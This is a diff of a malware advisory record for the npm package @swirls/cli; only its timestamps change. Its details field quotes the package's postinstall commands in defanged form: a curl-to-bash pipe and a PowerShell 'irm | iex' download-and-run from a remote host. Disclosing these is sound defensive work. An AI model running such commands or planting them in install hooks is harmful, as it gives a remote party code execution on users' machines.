@@ -1,8 +1,8 @@
 {
   "schema_version": "1.6.0",
   "id": "LWA-2026-13911",
-  "modified": "2026-11-11T03:44:19Z",
-  "published": "2026-11-11T03:42:55Z",
+  "modified": "2026-11-11T03:44:24Z",
+  "published": "2026-11-11T03:42:54Z",
   "summary": "Malicious code in @swirls/cli (npm)",
   "details": "The package's postinstall hook (scripts/install.js, run as `node scripts/install.js`) executes an unpinned remote shell script at install time: `curl -fsSL hxxps://swirls[.]ai/install | bash`, and on Windows `powershell.exe -NoProfile -Command \"irm hxxps://swirls[.]ai/install[.]ps1 | iex\"` with the installer's entire environment inherited plus SWIRLS_YES=1. It then copies the downloaded binary from ~/.local/bin/swirls over the package's own bin/swirls entry and sets mode 0755, so the installed command is a binary that was never part of the package. The hook exits early under CI or for non-global installs and ignores child failures. The executable content is served dynamically, so it grants whoever controls swirls[.]ai/install arbitrary code execution as the installing user. The bin/swirls wrapper only prints the same curl/powershell commands when install scripts were skipped.",
   "affected": [
@@ -47,7 +47,7 @@
   "database_specific": {
     "leitwacht": {
       "category": "malware",
-      "first_seen_at": "2026-11-11T03:42:55Z",
+      "first_seen_at": "2026-11-11T03:42:54Z",
       "indicators_observed": {
         "domain_observed": [
           "swirls[.]ai"
